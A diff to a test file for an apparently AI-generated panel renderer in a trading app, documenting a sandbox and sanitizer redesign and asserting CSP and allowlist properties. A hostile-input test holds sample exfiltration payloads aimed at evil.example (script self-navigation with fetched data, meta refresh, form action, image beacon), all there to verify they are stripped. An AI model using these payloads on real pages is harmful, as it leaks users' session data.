@@ -12,6 +12,8 @@ import {
   panelKey, newPanelId, isCustomPanelId, byteLength, savePanel, deletePanel,
   MAX_SOURCE_BYTES, MAX_VALUE_BYTES, MAX_PROMPT_CHARS
 } from '../navrya-src/analysisWorkspacePanelStore.js';
+import { ANALYSIS_WORKSPACE_BIND_SCHEMA } from '../navrya-src/analysisWorkspaceBridgeDoc.js';
+import { ALLOWED_TAGS, renderPanelSafely, sanitizePanelFragment } from '../navrya-src/panelSafeRender.js';
 
 const root = process.cwd();
 const CHARACTERS = ['hunter', 'engineer', 'commander', 'sage'];
@@ -153,27 +155,31 @@ test('resetLayout tolerates a board with no custom panels at all', () => {
 // Generation prompt - every constraint in it is a real property of the sandbox, so each one is
 // asserted rather than left to drift away from analysisWorkspacePanelRuntime.jsx.
 // ---------------------------------------------------------------------------
-test('the generation prompt states every real runtime constraint the sandbox actually enforces', () => {
+test('the generation prompt states every real runtime constraint the render surface actually enforces', () => {
   const prompt = buildGenerationPrompt({ prompt: 'a scenario table', lang: 'fa' });
-  assert.match(prompt, /NO network access/i);
-  assert.match(prompt, /fetch, XHR,\s*\n?\s*WebSocket/i);
-  assert.match(prompt, /No frameworks or libraries are available/i);
-  assert.match(prompt, /READ-ONLY/);
+  assert.match(prompt, /NO <script> tag of any kind/i);
+  assert.match(prompt, /NO scripting of any kind/i);
+  assert.match(prompt, /no\s+inline event handler \(onclick, onload/i);
+  assert.match(prompt, /no way to write, log, edit or delete anything/i);
   assert.match(prompt, /NO price or candle data/i);
   assert.match(prompt, /NO news feed/i);
-  ['getContext', 'getEntries', 'getScenarios', 'getPositions', 'getChart', 'onUpdate'].forEach((method) => {
-    assert.match(prompt, new RegExp('navrya\\.' + method), `prompt does not document navrya.${method}`);
+  ANALYSIS_WORKSPACE_BIND_SCHEMA.scalars.forEach((path) => {
+    assert.match(prompt, new RegExp('data-navrya-bind="' + path.replace('.', '\\.') + '"'), `prompt does not document ${path}`);
   });
+  Object.keys(ANALYSIS_WORKSPACE_BIND_SCHEMA.lists).forEach((path) => {
+    assert.match(prompt, new RegExp('data-navrya-each="' + path.replace('.', '\\.') + '"'), `prompt does not document data-navrya-each="${path}"`);
+  });
+  Array.from(ALLOWED_TAGS).forEach((tag) => assert.match(prompt, new RegExp('\\b' + tag + '\\b')));
   assert.match(prompt, /Never invent or placeholder a number/i);
   assert.match(prompt, /a scenario table$/);
 });
 
 test('the prompt asks for output in the trader\'s own language', () => {
-  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'fa' }), /user-visible text in Persian/);
-  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'ar' }), /user-visible text in Arabic/);
-  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'es' }), /user-visible text in Spanish/);
-  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'en' }), /user-visible text in English/);
-  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'zz' }), /user-visible text in English/, 'unknown language falls back to English');
+  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'fa' }), /user-visible text.*in Persian/);
+  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'ar' }), /user-visible text.*in Arabic/);
+  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'es' }), /user-visible text.*in Spanish/);
+  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'en' }), /user-visible text.*in English/);
+  assert.match(buildGenerationPrompt({ prompt: 'x', lang: 'zz' }), /user-visible text.*in English/, 'unknown language falls back to English');
 });
 
 test('the honesty rule is in the prompt, and a revision carries the previous source instead of asking for a blind rewrite', () => {
@@ -204,10 +210,10 @@ test('a refusal is still caught when the model wraps it in a sentence or a fence
   assert.equal(parsed.message, 'needs raw candles');
 });
 
-test('a markdown fence around the whole reply is stripped, but markup inside the fragment is untouched', () => {
-  const parsed = parseGeneration('```html\n<div class="x"><script>navrya.getEntries()</script></div>\n```');
+test('a markdown fence around the whole reply is stripped, but markup inside the fragment is untouched by parseGeneration itself (sanitization happens later, at render time)', () => {
+  const parsed = parseGeneration('```html\n<div class="x" data-navrya-bind="context.instrument">?</div>\n```');
   assert.equal(parsed.ok, true);
-  assert.equal(parsed.source, '<div class="x"><script>navrya.getEntries()</script></div>');
+  assert.equal(parsed.source, '<div class="x" data-navrya-bind="context.instrument">?</div>');
 });
 
 test('prose with no markup is refused rather than injected into the sandbox as a bare paragraph', () => {
@@ -320,43 +326,67 @@ const runtimeSrc = await readFile(path.join(root, 'navrya-src', 'analysisWorkspa
 // satisfied by the documentation instead of the implementation.
 const runtimeCode = runtimeSrc.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/^\s*\/\/.*$/gm, ' ');
 
-test('a generated panel is sandboxed with no same-origin access, and its code is never evaluated in the app realm', () => {
-  // The real attribute, not prose: every sandbox= attribute in the file must be exactly
-  // allow-scripts, and none of them may grant same-origin (which would hand a panel this
-  // document's DOM, cookies and storage).
+// SECURITY REDESIGN (v2): a sandbox="allow-scripts" iframe can always navigate itself to an
+// arbitrary URL - the platform's sandboxing model only ever restricts navigating OTHER browsing
+// contexts - so a panel that had ever received real data in its own script scope could never be
+// proven safe against carrying that data out via a single self-navigation, no matter how the
+// bridge TRANSPORT itself was hardened. The fix removes script execution from the render surface
+// entirely: the model's fragment is rebuilt from an explicit tag/attribute allowlist
+// (navrya-src/panelSafeRender.js), real data is substituted only as escaped text via
+// data-navrya-bind/data-navrya-each, and the iframe itself carries `sandbox="allow-same-origin"`
+// with NO allow-scripts - a hard platform guarantee that nothing in the document can execute at
+// all. See navrya-src/analysisWorkspacePanelRuntime.jsx's own header comment for the full writeup,
+// and tests/panel-safe-render.test.mjs for the sanitizer's own hostile-input suite.
+
+test('a generated panel renders in an iframe with allow-same-origin only - never allow-scripts, and its code is never evaluated in the app realm', () => {
   const attrs = runtimeCode.match(/sandbox="[^"]*"/g) || [];
   assert.ok(attrs.length, 'no sandbox attribute found at all');
-  attrs.forEach((attr) => assert.equal(attr, 'sandbox="allow-scripts"'));
+  attrs.forEach((attr) => assert.equal(attr, 'sandbox="allow-same-origin"'));
+  assert.doesNotMatch(runtimeCode, /allow-scripts/, 'no allow-scripts token may ever appear in the real implementation');
   assert.doesNotMatch(runtimeCode, /dangerouslySetInnerHTML/);
   assert.doesNotMatch(runtimeCode, /\beval\(/);
   assert.doesNotMatch(runtimeCode, /new Function\(/);
 });
 
-test('the panel document blocks every network egress path, so real session data cannot be exfiltrated', () => {
+test('there is no scriptable bridge left in this file at all - no BRIDGE_CLIENT, no MessageChannel, no postMessage of any kind', () => {
+  assert.doesNotMatch(runtimeCode, /BRIDGE_CLIENT/);
+  assert.doesNotMatch(runtimeCode, /MessageChannel/);
+  assert.doesNotMatch(runtimeCode, /\.postMessage\(/);
+  assert.doesNotMatch(runtimeCode, /addEventListener\(\s*['"]message['"]/);
+  assert.doesNotMatch(runtimeCode, /navrya\.get/, 'no callable bridge getter API is defined for generated code to call');
+});
+
+test('the document this module builds is assembled entirely from panelSafeRender.js\'s sanitizer/binder, never from the raw, unsanitized source string', () => {
+  assert.match(runtimeSrc, /import \{ renderPanelSafely, sanitizePanelFragment \} from '\.\/panelSafeRender\.js';/);
+  const panelDoc = /function panelDocument\(safeBody, theme\) \{[\s\S]*?\n\}/.exec(runtimeSrc);
+  assert.ok(panelDoc, 'panelDocument(safeBody, theme) not found - the wrapper must be a pure function of an already-safe body');
+  assert.doesNotMatch(panelDoc[0], /\bsource\b/, 'the raw, untrusted source must never be visible to the document-wrapper function at all');
+});
+
+test('the panel document still carries a strict CSP as defense in depth, including an explicit script-src \'none\' - independent of, not a substitute for, the sandbox attribute having no allow-scripts', () => {
   const csp = /Content-Security-Policy" content="([^"]+)"/.exec(runtimeSrc);
   assert.ok(csp, 'no CSP found in the panel document');
-  // The policy is written inside a single-quoted JS string, so its quotes are backslash-escaped in
-  // the source - compare against the value the browser will actually receive.
   const policy = csp[1].replace(/\\'/g, "'");
   assert.match(policy, /default-src 'none'/);
+  assert.match(policy, /script-src 'none'/);
   assert.doesNotMatch(policy, /connect-src/, 'connect-src must stay unset so it inherits default-src none');
-  // Only inline script/style and data: images/fonts are permitted - no host is allowlisted at all.
   assert.doesNotMatch(policy, /https?:/);
   assert.doesNotMatch(policy, /unsafe-eval/);
+  assert.match(policy, /form-action 'none'/);
+  assert.match(policy, /base-uri 'none'/);
 });
 
-test('the bridge authenticates the child by window identity, not by an origin string a sandboxed frame cannot provide', () => {
-  assert.match(runtimeSrc, /event\.source !== frame\.contentWindow/);
+test('height is measured by the parent reading the iframe\'s own contentDocument directly - no bridge round trip needed', () => {
+  assert.match(runtimeSrc, /frame\.contentDocument/);
+  assert.match(runtimeSrc, /new ResizeObserver\(measure\)/);
 });
 
-test('the bridge exposes getters only - there is no method through which a panel could write to the session', () => {
+test('the bridge root categories are still a short, reviewed, read-only allowlist - the same five this target has always exposed', () => {
   const methods = /export const BRIDGE_METHODS = \[([^\]]+)\]/.exec(runtimeSrc);
   assert.ok(methods, 'BRIDGE_METHODS not found');
   const list = methods[1].split(',').map((s) => s.trim().replace(/'/g, '')).filter(Boolean);
   assert.deepEqual(list, ['context', 'entries', 'scenarios', 'positions', 'chart']);
   list.forEach((m) => assert.doesNotMatch(m, /^(set|save|add|update|delete|remove|log)/i));
-  // An unknown method is refused rather than answered with whatever happens to be on the snapshot.
-  assert.match(runtimeSrc, /error: ok \? undefined : 'UNKNOWN_METHOD'/);
 });
 
 test('the snapshot handed to a panel carries session facts only - never identity, wallet, or image data', () => {
@@ -364,5 +394,71 @@ test('the snapshot handed to a panel carries session facts only - never identity
   assert.ok(snapshot, 'buildSnapshot not found');
   [/email/i, /userId/i, /token/i, /apiKey/i, /wallet/i, /balance/i, /imageBlobId/i, /preview/i].forEach((re) => {
     assert.doesNotMatch(snapshot[0], re, `buildSnapshot must not expose ${re}`);
+  });
+});
+
+test('this module never imports from, and is not imported by, dashboardPanelSandbox.jsx - the two runtime COMPONENTS stay independent (they share only the generic panelSafeRender.js sanitizer)', async () => {
+  assert.doesNotMatch(runtimeSrc, /^\s*import .*dashboardPanelSandbox/m);
+  const dashboardRuntimeSrc = await readFile(path.join(root, 'navrya-src', 'dashboardPanelSandbox.jsx'), 'utf8');
+  assert.doesNotMatch(dashboardRuntimeSrc, /^\s*import .*analysisWorkspacePanelRuntime/m, 'the two runtime components must remain unaware of each other');
+});
+
+// ---------------------------------------------------------------------------------------------
+// End-to-end proof against the real pipeline this component actually calls, not a source-text
+// guess about what the sanitizer would do.
+// ---------------------------------------------------------------------------------------------
+
+const WS_SNAPSHOT = {
+  version: 2,
+  context: {
+    instrument: 'EURUSD', timeframe: 'H1', market: 'forex', status: 'active', startedAt: Date.now(),
+    elapsedMinutes: 12, loopMinutes: 5, language: 'en', direction: 'ltr',
+    entryCount: 3, scenarioCount: 2, openPositionCount: 1
+  },
+  entries: [{ id: 'e1', index: 1, type: 'note', createdAt: Date.now(), timeframe: 'H1', note: 'x', hasImage: false, scenarioCount: 1 }],
+  scenarios: [{ id: 's1', entryId: 'e1', title: 'Breakout', side: 'long', probability: 0.6, occurred: false, patternTitle: 'Flag', completionPercent: 40 }],
+  positions: [{ id: 't1', instrument: 'EURUSD', side: 'long', status: 'open', entry: 1.1, stop: 1.09, target: 1.15 }],
+  chart: { symbol: 'EURUSD', interval: 'H1', embeddable: false, note: 'no live chart' }
+};
+
+test('a malicious generated panel cannot self-navigate with real session data, by any of the hostile techniques, once rendered through the real Analysis Workspace schema', () => {
+  const hostile = [
+    '<div data-navrya-bind="context.instrument">?</div>',
+    '<script>fetch("/x").then(r=>r.json()).then(d=>location.href="https://evil.example/?d="+JSON.stringify(d))</script>',
+    '<meta http-equiv="refresh" content="0;url=https://evil.example/exfil">',
+    '<form action="https://evil.example/collect"><input name="d"></form>',
+    '<img src="https://evil.example/beacon.gif?d=leak">'
+  ].join('');
+  const rendered = renderPanelSafely(hostile, WS_SNAPSHOT, ANALYSIS_WORKSPACE_BIND_SCHEMA);
+  assert.doesNotMatch(rendered, /<script/i);
+  assert.doesNotMatch(rendered, /<meta/i);
+  assert.doesNotMatch(rendered, /<form/i);
+  assert.doesNotMatch(rendered, /evil\.example/);
+  assert.match(rendered, /<div data-navrya-bind="context\.instrument">EURUSD<\/div>/);
+});
+
+test('a data-navrya-each list panel renders real rows for the real Analysis Workspace schema (scenarios)', () => {
+  const source = '<ul data-navrya-each="scenarios"><li data-navrya-bind="title">?</li></ul>';
+  const rendered = renderPanelSafely(source, WS_SNAPSHOT, ANALYSIS_WORKSPACE_BIND_SCHEMA);
+  assert.match(rendered, /<li data-navrya-bind="title">Breakout<\/li>/);
+});
+
+test('sanitizePanelFragment alone (no snapshot) still strips every hostile construct - used before any panel has real data to bind', () => {
+  const out = sanitizePanelFragment('<script>location.href="https://evil.example"</script><div>kept</div>');
+  assert.doesNotMatch(out, /<script/i);
+  assert.doesNotMatch(out, /evil\.example/);
+  assert.match(out, /kept/);
+});
+
+test('every scalar/list path in ANALYSIS_WORKSPACE_BIND_SCHEMA resolves against a real, representative snapshot shape (buildSnapshot()\'s own field set)', () => {
+  ANALYSIS_WORKSPACE_BIND_SCHEMA.scalars.forEach((path) => {
+    const html = renderPanelSafely('<span data-navrya-bind="' + path + '">x</span>', WS_SNAPSHOT, ANALYSIS_WORKSPACE_BIND_SCHEMA);
+    assert.doesNotMatch(html, /<span data-navrya-bind="[^"]+"><\/span>/, `${path} resolved empty against a representative snapshot`);
+  });
+  Object.keys(ANALYSIS_WORKSPACE_BIND_SCHEMA.lists).forEach((path) => {
+    const fields = ANALYSIS_WORKSPACE_BIND_SCHEMA.lists[path].itemFields;
+    const rowMarkup = fields.map((f) => '<span data-navrya-bind="' + f + '">x</span>').join('');
+    const html = renderPanelSafely('<div data-navrya-each="' + path + '">' + rowMarkup + '</div>', WS_SNAPSHOT, ANALYSIS_WORKSPACE_BIND_SCHEMA);
+    assert.match(html, /<div data-navrya-each="[^"]+"><span/, `${path} produced no rows against a representative snapshot`);
   });
 });
